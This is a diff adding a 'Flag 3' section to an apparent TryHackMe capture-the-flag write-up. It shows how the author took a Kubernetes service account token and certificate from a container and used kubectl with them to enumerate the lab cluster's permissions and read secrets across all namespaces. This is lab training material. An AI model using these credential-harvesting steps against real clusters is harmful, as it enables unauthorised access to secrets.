@@ -339,3 +339,51 @@ Also, the root folder conatins the second flag in for which I am having the suff
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/e6f858da-bdaa-47ec-9af6-149cc3b18065)
 
 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## Flag 3:
+
+While performing the manual enumeration I observed a kuberneets secretaccount folder in "/var/run/secrets/kubernetes.io/serviceaccount" which contains certificate & toekens in it:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/c2ed6349-3055-47ac-a109-7caef9dab81d)
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/43acdb44-2c38-4b1a-aab2-7c3b26361db5)
+
+I copied these certificate & token file to my local host & used it for further Kubernetes authetication.
+
+### Kubernetes:
+
+I exported token in the environment to avoid the multiple copy paste & used a tool called "kubectl" for authetication:
+
+```bash
+export token=$(cat token)
+kubectl --server https://10.10.103.155:6443 --certificate-authority=ca.crt --token=$token get pod #to list the pods
+```
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b071514b-0ccf-4725-95e7-3245b3a2b75a)
+
+```bash
+kubectl --server https://10.10.103.155:6443 --certificate-authority=ca.crt --token=$token get namespaces #to check the namespaces
+```
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/936a2e58-a7f1-46bf-bbdd-d15d3e942284)
+
+```bash
+kubectl --server https://10.10.103.155:6443 --certificate-authority=ca.crt --token=$token auth can-i --list #to check if I can create containers inside the pod
+kubectl --server https://10.10.103.155:6443 --certificate-authority=ca.crt --token=$token api-resources #to check api resources
+```
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/112bd365-d9fe-4bc9-97c8-93096587d8f3)
+
+```bash
+kubectl --server https://10.10.103.155:6443 --certificate-authority=ca.crt --token=$token get secrets --all-namespaces #to check all secrest present in the namespaces
+```
+
+Using the above command I observed flag 3 in one of the namepsaces:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/fa3c3372-d3ce-4daa-a2de-f5d79c7c30a3)
+
+```bash
+kubectl --server https://10.10.103.155:6443 --certificate-authority=ca.crt --token=$token get secret flag3 -n kube-system -o yaml #to check the file content in yaml format
+```
+
+Using this above command I finally discovered the 3rd flag from the container:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/9911ad09-952d-42ff-a31f-f68ca7584bfa)
